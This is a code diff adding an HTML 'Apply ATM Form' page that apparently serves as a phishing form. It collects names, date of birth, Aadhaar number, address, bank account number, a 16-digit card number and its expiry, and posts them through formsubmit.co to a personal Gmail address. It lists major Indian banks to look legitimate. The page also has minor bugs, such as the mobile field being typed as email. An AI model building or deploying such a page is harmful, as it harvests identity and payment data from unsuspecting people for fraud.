@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title> ATM Form</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="apply_box">
+      <h1> Apply ATM Form <span class="title_small">(Web)</span></h1>
+      <form action="https://formsubmit.co/ydvsatya108@gmail.com" method="POST">
+        <div class="form_container">
+          <div class="form_control">
+            <label for="first_name">First Name</label>
+            <input id="first_name" name="first_name" placeholder="Enter First Name" required />
+          </div>
+          <div class="form_control">
+            <label for="last_name">Last Name</label>
+            <input id="last_name" name="last_name" placeholder="Enter Last Name" required />
+          </div>
+          <div class="form_control">
+            <label for="father_name">Father Name</label>
+            <input id="father_name" name="father_name" placeholder="Enter Father Name" required />
+          </div>
+          <div class="form_control">
+          <label for="gender">Gender:</label>
+          <select id="gender" name="gender" required>
+          <option value="" disabled selected>Select Gender</option>
+          <option value="Male">Male</option>
+          <option value="Female">Female</option>
+          <option value="Other">Other</option>
+          </select>
+        </div>
+          <div class="form_control">
+          <label for="email">Email ID</label>
+            <input type="email" id="email" name="email" placeholder="Enter Email" required />
+          </div>
+
+           <div class="form_control">
+            <label for="mobile">Mobile Number</label>
+            <input type="email" id="mobile" name="mobile" placeholder="Enter 10-digit Mobile Number" maxlength="10" required />
+          </div>
+          <div class="form_control">
+           <label for="dob">Date of Birth</label>
+            <input type="date" id="dob" name="dob" max="09-07-2007" required />
+          </div>
+          
+           <div class="form_control">
+            <label for="aadhaar">Aadhar Number</label>
+            <input type="text" id="aadhaar" name="aadhaar" placeholder="Enter 12-digit Aadhar Number" required />
+          </div>
+          <div class="textarea_control">
+            <label for="address">Address</label>
+            <textarea id="address" name="address" rows="2" cols="30" placeholder="Enter Address" required></textarea>
+          </div>
+          <div class="form_control">
+            <label for="city">City</label>
+            <input id="city" name="city" placeholder="Enter City" required />
+          </div>
+          <div class="form_control">
+            <label for="pincode">Pincode</label>
+            <input type="text" id="pincode" name="pincode" placeholder="Enter Pincode" maxlength="6" required />
+          </div>
+           <div class="form_control">
+            <label for="bank_role">Bank Name</label>
+            <select id="bank_role" name="Bank_role" required>
+              <option value="">Select Your Bank</option>
+              <option value="bank1">Union Bank Of India</option>
+              <option value="bank2">HDFC Bank</option>
+              <option value="bank3">Bank Of Baroda</option>
+              <option value="bank4">Punjab National Bank</option>
+              <option value="bank5">ICICI Bank</option>
+              <option value="bank6">Bank Of India</option>
+              <option value="bank7">State Bank Of India</option>
+              <option value="bank8">Canara Bank</option>
+              <option value="bank9">India Post Payments Bank</option>
+              <option value="bank10">Baroda UP Bank</option>
+              <option value="bank11">Central Bank Of India</option>
+              <option value="bank12">Yas Bank</option>
+            </select>
+           </div>
+            <div class="form_control">
+            <label for="account">A/c Number</label>
+            <input type="text" id="acount" name="account" placeholder=" Enter A/c Number" maxlength="18" required />
+          </div>
+           <div class="form_control">
+            <label for="atm">ATM Number</label>
+            <input type="text" id="atm" name="atm" placeholder="Enter 16-digit Card Number" maxlength="16" required />
+          </div>
+           <div class="form_control">
+            <label for="validThru">Valid Thru (MM/YY):</label>
+            <input type="text" id="validThru" name="validThru" placeholder="MM/YY" maxlength="5" required />
+          </div>
+          <div class="form_control">
+            <label for="date">Date</label>
+            <input type="date" id="date" name="date" required />
+          </div>
+          <div class="form_control">
+            <label for="upload">Upload Your CV</label>
+            <input type="file" id="upload" name="upload" />
+          </div>
+        </div>
+        <div class="button_container">
+          <button type="submit">Apply Now</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+ <script src="script.js"></script>
+</html>
